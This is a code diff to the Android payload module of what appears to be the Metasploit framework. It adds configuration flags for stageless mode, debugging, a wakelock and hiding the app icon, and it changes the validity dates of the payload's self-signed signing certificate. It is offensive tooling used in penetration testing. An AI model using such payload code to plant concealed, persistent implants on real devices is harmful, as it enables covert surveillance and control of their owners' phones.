@@ -51,11 +51,17 @@ module Msf::Payload::Android
       arch:       opts[:uuid].arch,
       expiration: ds['SessionExpirationTimeout'].to_i,
       uuid:       opts[:uuid],
-      transports: opts[:transport_config] || [transport_config(opts)]
+      transports: opts[:transport_config] || [transport_config(opts)],
+      stageless:  opts[:stageless] == true
     }
 
     config = Rex::Payloads::Meterpreter::Config.new(config_opts).to_b
-    config[0] = "\x01" if opts[:stageless]
+    flags = 0
+    flags |= 1 if opts[:stageless]
+    flags |= 2 if ds['AndroidMeterpreterDebug']
+    flags |= 4 if ds['AndroidWakelock']
+    flags |= 8 if ds['AndroidHideAppIcon']
+    config[0] = flags.chr
     config
   end
 
@@ -72,7 +78,7 @@ module Msf::Payload::Android
     cert.public_key = key.public_key
 
     # Some time within the last 3 years
-    cert.not_before = Time.now - rand(3600*24*365*3)
+    cert.not_before = Time.now - rand(3600 * 24 * 365 * 3)
 
     # From http://developer.android.com/tools/publishing/app-signing.html
     # """
@@ -83,7 +89,16 @@ module Msf::Payload::Android
     # requirement. You cannot upload an application if it is signed
     # with a key whose validity expires before that date.
     # """
-    cert.not_after = cert.not_before + 3600*24*365*20 # 20 years
+    #
+    # 32-bit Ruby (and 64-bit Ruby on Windows) cannot deal with
+    # certificate not_after times later than Jan 1st 2038, since long is 32-bit.
+    # Set not_after to a random time 2~ years before the first bad date.
+    #
+    # FIXME: this will break again randomly starting in late 2033, hopefully
+    # all 32-bit systems will be dead by then...
+    #
+    # The timestamp 0x78045d81 equates to 2033-10-22 00:00:01 UTC
+    cert.not_after = Time.at(0x78045d81 + rand(0x7fffffff - 0x78045d81))
 
     # If this line is left out, signature verification fails on OSX.
     cert.sign(key, OpenSSL::Digest::SHA1.new)
